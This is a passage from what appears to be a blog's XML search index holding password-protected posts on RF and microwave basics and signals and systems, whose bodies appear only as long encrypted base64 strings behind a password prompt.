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]]></content>
      <categories>
        <category>RF</category>
        <category>信号与系统</category>
      </categories>
      <tags>
        <tag>信号与系统</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[射频微波基础知识（二）]]></title>
    <url>%2Farchives%2F17d05ce0.html</url>
    <content type="text"><![CDATA[请输入密码 Incorrect Password! No content to display! U2FsdGVkX18x1Qm6bi4jVXp+VtxeE8KZDQK79ah4cq2surbxhqgSZiKUp13viDbsa1aJByBcvkcPZ68PDtctd4/q6fn8CE0lgopQKy4T9b+LQqHohsxqtyGIM+MCIpXjuS2TcMes1hMA+XXVJpSjyKAdfj6jhvlgrBjdqYZ26PMclXU4iq4lnSKyfkAB9s0H++O0hQ3uvFQDWzDwXM+OvlsmdC70cqSXq59xL6c5aqzvBoc0Lx7yCepfsmdvifnHA8G2wW5FOFBp/4LuoO0/Oc0RnRtAmGy5p5+GypdY2mLSACZjXjOlQ3ZErXQeB+sY8dDCARH8eDuGj1HDAIKj8duus62NSOH/cKlR+4HNaD+woPzmqnA9eP3sobblJKAOgTyr4zj/MXI3+z8DAlsio5Is/IfEZxknhpKck0Z/khWWeDoGuvFXsw/dOZGZOjlMbNoeLbiVRZwDl13yO3WeTQIoHrqXW30Q+yQchN+b05OWipWrqVforGTYwOI70+eUbsf1aj7jfR0lAM2mJJzl4mEVXb0jG+m8U2qO7tA3oj8ABXlK6pUZkhmmxTXH9nsgnf6Hb9RPCOnaaV6160dvRE0kqJ+TC3O2ybSv0j7ji2Pzl2oN8p80Q51oHDmgxiIZekfs1fuWmvLrhaw9MvF0tMO3AYQSE3O/jVpLz6OxeId83f+47hwAWSo867khzJyUmK8jzptDrgwj0a7jkMUUkpN4JWBzTaUjsnEz8okgPwNeVXCl1UJwEDRUhchUey4bGtQZ80FWIxr8cJKRFN762KYK+KMuU/2X6EyiWHAeSzvlaarZr6uidnnPLXyGqWoQRSwCo4SbDT37topYNpJUV/Mm8dI+UdpFAUyd+uJkIVI0/zo5q5pFhQTyCRxRKlg9KklbpB9cDtsNMtSvb3xVVvuCIOW9v5u6r3Z3pAKowFyFHL25LPJfalywXWPvgHZR0LpxJtrUlWua51INKnNDX+BbMS6xcQLV9/3msVt8DKRCmbOREMxNXq35NuKVLtWDEfERpKL6i0gSwccDUcntbVaeMdm/0Y2ghRiQX2zPoht/KRoU1FYl1U7FPKqRM5HNhbJwvT6UKziB28Yo0fEM7jycK5zySNneNu1/sTfuk6RHo5j+efaesS6vGhC+LForLQvqgeMaUFaqFbOUbOjM1xdgJd08MtZVWKoipeA/RKLoMvW+04B8YkjR8OygShYeA48lEYPFl3mr8SW0sKQY4HA9SVlLb4t6jW8OsGIsahnwVFksvnWUx6j5oonQGHSe17pQ4x482iTTMBjQNG1cA6zIk4y+j8DanMCtWwzN2nCoKez5LGjZkBolAM3nrRD1kSSjf0hpzGlPEhJ+QT/72A6S/726GJk8UtTaY9FByTw8gVnRcqeU4VXRwJ8UYHnTgPM8ZAVvnE0B26eO5J9EUxXdD3tu2KVSHxrHwwd9l4AraDfL422ydV45rwdluxjkOzMeqy4vQ0hK79tOH03MkXJvErgDX46JNQDRtfGxLaP/f7yIOmCUuC8mkVWdf8r8XsIfbK4niRTpjAasBqmT3wiaxyCgbfADokTOfZg/b1HmrP++aTuTv+8IdaSbTgfAeABfhr4NSr3pWIjgt66BfQWVQ9Lv/ltTE3BSsO8V8EfGjpEjHJreoLgyaTSnxgcjbfAiTsWcvr4oS5JX1axR0WdKi40krvDD56hHFPJ1w5IsmcCDWkaukgF+OhpPJ72rDb7Ef9IbVtpLEvl38tBqvN78E/l/SSelz6CpoqJlGYJqXlVWRRmnhox4dS+q5UVWWantD/Brgla1+D1ghoSNMU9XbeM1oigXSlOXPvOYdCYyzYF7WbCXqD92JZZRIOD7f2XBIhFq3DSbLlnijVDxTGzXUjzLYNtnNTUgIUvK+RRtv3QYsbRBQTh/l5+bsL2bqIg779tGqStWi77fWf1IZiGDMohe9/BVmbRWmcxObNMLIin2eAOsfs39sGAMSxvpESTksaDlxlIlG1jZXxILXxk2vszU5kZLJAaYm7sL1nhUQ//WVCd4+eMiCwZQClVH3DJzl0HdURxfKUHH6XfY42avJ8aQiqA349fXgZeiQIJKhZQikS0YyTFvjPzOlEIU49DxRyQ1XAe3iqSLyY8O2z5tNYa2iN0DpBrqEFNdDUAH2VTKRPcyWAUByj9hGfyhNRqfrGRjMkIFBcSnxVixGW8gMSXEpGJ7Rlof24DkZbTiszB1YGGss+cQS7Sj0CvQI7FlxbVDlXVq/nHBskR2qp7HGK8QpUkq15xaVVm/RualizS5b78djvWeRfEo5hj0B5IJfn8zx1IKj/lOPtIwRqB3CnJf31Pd/JBXdcHfr+KtXqCxngh94zNNOK95c/MLQ438C+qOOlUdHboOIBAmvSfLuxC+FIlzy2I5s06ZwtW0ewQ+DNswsj2+V6rpmqeVvRy8zbSzujRid4P3yfksV5IDQoCnQUQoRfsxDIT1Wb4EgP2803SOpBgKMkadzJ4zabeF3ibkDCEEMwF7jTZRadN9X9fUQr0CyuCutAhuRkxuoKXKkUEgmIAxLiHiAlZEus9ulup44X8EEpxwx6iVOcARLuHt7aydFwTV0v4HjLev7lruya58fzE5DGhM+sGMJfs48D/ODi0PTQuxNjbFs7UTxcbD/9BmFns6t2fVEoiIZXgeyFVWwZ8vC5a350NjAZyHsR09HBiC3nFQVndAWIIk4UVF4/RSf4HmECiOFD9AyuktZn0BAao+8fI3XMNOUBHw7hzZZTe8E5STCCMw+p4g4pXofvDHc0X3AeN9OPg4axDDCJk4Masrf01bDYCgSF1eHieJPKSK9jqPbN3wpLeVO+EBQufcauXjeZtGbAhyh/zH+AtW3/OLYgOBQEvO66Tv9pQ/AKmKJeszoitxbQQ9DYqdePUJ+VjxxgKTR/NxasqzrXHxv8LL/BNKSr/2xlf3vNjRit1QIu6xiQiKoBef2vwOM18TM+G3nthlU6KmLJTPgH6rfxdrUWBm/gOSSy11WZwkUPcwNxxPr7iZQYHUdqEZePb1SSQ5nPaJCHTSjRnkIeLcLVJ4D27DktCwun+6WNqAB1Gd+JY7bl6CvO84/c3uADF+ghU5/uJZ6aiatcJhpLeCfnSiOaTM+aARKia1ZoOYEg+A8ORfgZTegg+1zT/D6ESzvFFJpqRS0ck9689+sOlovh8bLuI/NThQhC7pYsopqaIHIDbyKPa6kcA2iR1YnWlQ3ViCzN4TAUw1brX/6lKzR8EtWRn+Os2O1K6Q5A4d6Al8U0Vjo2aQdBcTL6fr4DLCad9ZWPVHtt/ZknSn6TkD8BSCvNMMse7YSCzJXjIppn99hs5nHBIgfWSVpLgLKwkuHE81qfFahXvipMCKvc+n9U+qhzPTuiCGa8SI6xZe7yTbF3Kzljwv3wud+QalKal516gqqSPH/KRc6HKlzDYH58cmGu5xzwZSEJ276AQnMoAyJf+DNg/eVjgQPLY1WfonynkQNNxjjG2P+r56lEfD2QvT4zu0kBZTHA8ryLD2myqYOoAwMuiu41/NhnEQAK4RA7gAdMPvk5FroVZ6qmFC9w1V41/ZCZL9wlzVXgrunXnKhaS4jXjefX5cwOMlAu+DBI6vHmYX6RQ+7SRyDstsWm7Gf/1LhKvhy6EuvARiERzZ/5OgfMjRpsCSL3K8z4Y79JI4GuEisjchr1b2B4GBLssQpf8SB+akHDTJhrLAMeM6R00+Zrr2NDN9+SssYB7u19cj5ZJmwZvZOkUzl1lh78/0zZ17yDumjjTzq8H+vaxm5lziP4jakDx8vqQ+aea5I0FzBThPF2vwF5fONBuPhBLcShlki1l5TJvTF5r0UhtxT47bAabFSMMXW4oq6r3r9Xd5SG/epLLWJe/aJonU+2ZNXP7ihPeGOv2kF8iP4908cI/+iqIQp5BnAtk1rjxF+HkB60laCVdx0N2agHhuS1N/pEPsMdxya+NvrlLeCBiIKCc+SF1B3jroYavIUPNhIOTM1efZ+FoyUNGf+48HflUYP/OOhkVz5C/DEJSTNNsgxLvJIq4fDC9RLn95wJMoZstnU/vfDKU4KafbNUyx3h6FxG4oClkikTzH6T3+V4fuYrjEiAtMU/nf/hQKDUL8RgD1LQs9XEfgcUVLh21zu2uP6cgZOFbW+u2XYOUJMWu7IAbDmGvJt2e0i/NnsVkn4RvYbPpnBu5iFdRTi4jKR3d/V5RahyGWAnsBk6QstnQuKEzIi69XlzN38edkIEE2oUh9LVfioC7b3m7dfvB7dgAgIIx307IHkYEwsL3ClSYf74Jiw0V9y/APwmtQkpjD7ckh6pjs1nK55Ns4HU0b1DFNXwYKvEhnjSwKQgwR1s6+hAcQFsCs7IBs3UyuK0AXoDdvqMCJJC+kSmRm+9I0v8BJUTf4s0ItFJg4AcSr47qMQihJsW4yd51gnm1E1g1Peo5FC6QFyxxDtAbLFm1oUnB4oFdhDvDVcTfxD+x41eFRTDq1WUn88iph86BzlLfsQAMSXz1/QyYZVHVAU/pFTZ/MfMnSP6lSHRrxAzdMyeF+VAtv5GcJCoIGjCjJRjV6AhWWdblglbC42PIR26lrpndO4VTZhHK0VkQv1Za0SY9VsUYLpDnhQGZO8i5kqaYs3xwuexEj7nD2Sf/p56jmH+UdOxHnRF34nO8y/HgQ6cT5q1gfXTu2atK6D0y3xxuv6nBuziUJ+a75s8rD0jukUTxvicfzgpQJB4ONG+nB3HB3jn8iAUQcr/aZZELWZzAJoA6GWqKRMt70jHhB1FJ4SCKo08KpEfuY+JMKMoZCiR4tcbq5BJ9o5VUGfm00s8uJwKqpBv9VgF3JboR4j2JlVNXHUMetARqdz0zGEgXXNomXXnwXwF/Tlc5wPSGAr/rXS60UvQ6tByBrvnS+Z6ebn7KLJ7rBew8V6wcI8U9UiQgo7tDYplVZLKwef+NhSzj5NmAmQZmSz40mGWScw5apKYfOBVXG3IoSn64YTmqiLTiajwLnhRYe/GeNun6KW/Afh75/aDNRATUW2Gu6C40p9KFyRarS+EQJLrGFwMh9paT3kT2QWdHFebiugkDdzCUYRuSok6PxGJs4CVtEb2Lc70GLFtFjkN4JpcRPLP7nolwKNOF1cODCGM4GZfjxwpMr2W5JibZ3qoOhl6PPQ0PkwhGJgfkOe/Tz6h2pXgvNyQcfRwi2kIaof7WJVCSRInOJ65+DP2q4vu93Vu+eF0D7Tr6dsFH5Puv0CTTAe7zB+HxR6zHVCEew3ov+G5Cvt1lUGLPDgOqxm5niyE0obzJDkBEl4qS2Gb2/o1RJVGDoF+dQZ+9u6SHAzqDidP1E8Wedta5e1hivcgmjfwuPVgYDMSfXA0Y6BgJjPnmUbaztqCbtUv/NX12oHVyZu3wABRiYN9moZ5+aF90FhYUwEBxx+foPFMlu01ttqVLrxHQ19xDATzaxrp8FrC4/a3ThvbfBXxAhS78Ah61g0oKvmXi/UXFbKBecr3S8+RO1uFyXtPjcMTIV0MFk0a6DhFIPWaEho0ZWoUaqnXZR7o1p8SjLswTV667k5Wqw0LntP6bfdyLHjaWuOV5zmBsnZpTwl/dEox5rztXJz6TLnjEDLzdPejyH6TFRx+QPL7FwyL+ciVEr97BrH95y26q/NbHnQ0PATDrYy028Mlp8Do+m8XE/xRPGrwrguvbt9Bk9xzvWg8wc1sOZtM0/lc/vayCD/wqHoN44mR0UbAGULWmOBEZJ0rtTRR+QexJeVBbo/8a1LvO9T+YMofR22HIWmlEaM3xL1Kk70+fAkqd1yUotvHQ5MQTbCgDje4EOWFzFDhJ6h3y5HTm/CIfyHB0TzdysRC2EIPOkzaJS/PvoMi2pkjBzVqiy9eiwClwkyzaZuTyRM5nwjLJ0Yji5nS8CzR4w5xwoRJc5cieVfTPEYyPwvET7BrPzdkBC+y9HRu8oGNCs3A87VEp3VhAJj5cY2g8jSSBGMlMtpifp0ROi+NjEsulMDSnBEffIScsl5dxpSKeia1WZcWYsnM5rDURjZsKSJ8kauQ0YI1JsP5Ue9tsH6+T8w8rQz3NkOzi3FptlJf2+KlvRQfPBg7gt5Bgl+NfZexbp7crvpSeemqgwyt9KJUF7Ovh9R7nSUFRxzOr+0aTdNW9lK62HqH7Jw89JOpnHzsyjIHm4K90gab3eMbEIhALrpnRAgvAMl7DzcIIPbkLK3wfSGsCo8O5TI8F3BIdrq7rNqpyQQsfUj9t6DSTkYGdq7CI7XK2Ahl/+2DbAy4eR2dpoXZXk0dJFCQASK/ZAB2ztFtALV9fLWl6EAYsLR0oAVmcbNsSgB9nrTU8bJQRNbUR6d7aKNyV45mGg4g9GcawrxVWBNurFMn4PXgYid+dRyH1oDESn/cfh2mQwhpwn4KY6vvuksf/d8FYOufdv8gElAiicm18ZPwyT2OUf+0zLxE+0SqDzNGvZ6/Jo5qrlcDEH9YIttBgllM7TqBmpswdV6y99Xl4wSkoajBTfFG7V4p2i4KCAmc4U0eZn74AF+nBD4ZL4gP5xPgmi7oeF2HdM+O1Ae1xxGrPtR4EiyM+4eOc/Ec4t6Iv+E8ftFfOcQuadMNaRk+uYqZ+WMwh+u9UMCK5oPyHt1YT9yBDN9rNTnZIATR6PvuwEhBAepM72kBO956t5/Cc1fkhEaXrCRkknr82/b0f5qtBuuTMybo9n247ILypSJ+wZnqCA5ZpnVklQtiHbxCeiR04HjnxnGc5YcZvoy3phSy3Q3i7rlW06o3W9n3G0u8KoNqAem+sbBvXUTxJrTObp1BmKh0FaGUtWigb6qLeKjqzJVbSMaTHQJqfgJ5LUnYGOBXZL7SMfwRSTiHRpHqs8WgekLb0M3Dc2RhUTIp3fOQOh6crqn8KbaA/8Xls8i+vzXBnBslu6UDFyyUDlpizQcXwHVK2wnoQdH1pq9s23qCn2vA7BVtYBYelS92lfpLRC0Zsg4Jic6ktY9d+zTOssdw1PoJfC7+5AgfqDK/8n94waqOpG+miObur6F1DWbabXEe8+Zq9Vkz9bXl4PuiWx/3hS/S5ZtTErbQUYvh7vrv5rjKdbTEvgzkobxn60j5PddLoq0RuiEalnFnyLcTowL3bKfdsZceVboP/17XxWwFacnPVx12AYqIwhP0vyJsX1jGxsuezFwBk2eZ6xI8Lf6LIGm7n9HC1LrArHg6FlPtAaR1E7glTHK8VTycefhes2zuNm4HDNIYoD0mFWDyckUEPK6X1QxHdIKDG26UfHj+HiJNRyTJMsq/3OpkSpQCNppOp/2bdgbdtc9wgNPz+IrNXaKURyE4WrIzMbiePp64b+gd1XY3PAPxR2S1WbLguhFpD1h/4iKYpc20wNHdHFrQ5q4uTqIjeBBRoXkloeCoAVCPEIWYRhmP1nAWhlyqLaF05SP12cBKs8Ixrhqyz32seFoNLKZUTUmlguusP/SKtIDo57mxgLZE2G3twgACUGAPaFUV+g9wF4+tUPp8fcmiVzQRhHK3yA4GCilmjtM7k2KoX+JkAqVFzqWWN6kySIjxzHJaiKA9FT8TxCejGd9MdIeogltkNWu54SZkq6HBYDrsXIz37Cguf20bRJ4P++pfU4dAeXjeqsC/jMIjEacaek/JjvNn5OUrmjDl/bGyLHOZCxVRkJQJD/Pnllpdh2/5rVAa+tktrIf/YTT6/kGIaD0+97j9uJ8QqmOHBsVchYFK/aI7MbdNRjKhiXlt78icqxxTRSukA0fjYjWA03Xq2UB691wKvoUuH0f8+QCWOEjnyUXk8SksvedsArBja4WvdIvkjKKHi6KSZbz8kQjpGhmkDyZeseoeGcjESeoinuQ+8s4eIZaEMS3IxYhFwD4NmpkpVYuaDpO1Dr39ZB6D+1EoNl91g2JjNnbLGJ2EAcyI63rQL0rfUwPm97UkVNSYQAwJjteIpqig2KUwFoTvdmqgNlbL0vuSiiPnLyhgRKi4bwdWw9RHdj325J7SSuU8EXhx+SfzT4fpSfdjlDF+syxaVKckgezxq7Xd97mpxTj3b3296RcQjEcccPpviVqLax6iEIjE8Kjjnh91Khfs5G6idC0djY7fPfUCITZpiUH7Chot7m4morFeBDAdaT/Xbrq23cVmiG9w2gLcnTA4DfRmHT7eQjL7vMP7whEy4AHK+Hua6ANRLEuEPofoBzMIbWL8EA4RhedJ02Q7usSzaXvup49tq3xX5FBfURlHy1xtl/tXYqoFPfAGvJAoWiBrdwayQctOghYszPvKCguXJ3yAvZIfdqNYxWZ88ntVLe80+p3PocHReUAU5TE3oAw6pZ2d0hoYSelKqu5coceWPd3gEydErHDz78w03POOazrq+X/DF2zFEolExZEuxQnRG1K4GvWCJ6E/4yFCjZucYFEBO7wLua8LZjmSBxfwgj344AlJUP68RUJF9GarrbKiForfqzWNnyvw9l28Yvk3oIxAVUzeqySkAd4fE3CpakvBcWYqrqKHcOGm1FIkkih9NgJG8O3KJR/W419Yd7xtDbnARCmWrPxDQ/mLYG6nC+NGYu9pXBqf0bowktPciFXGW6WFsLI143ptmZHfJIq5wdXa5vCUo+M5S+Ty/CyiIlxGJFpM1aMkObPuvfsxJf2xdO+JhecIuluOHs/ar0AvIiCiV7xUq4CzfJCZUfjztHMERd0VSP+jc8x8RD91yYSVy+gIO5VCmZB+cLEpQnEXaI5yxvLyLolV/vb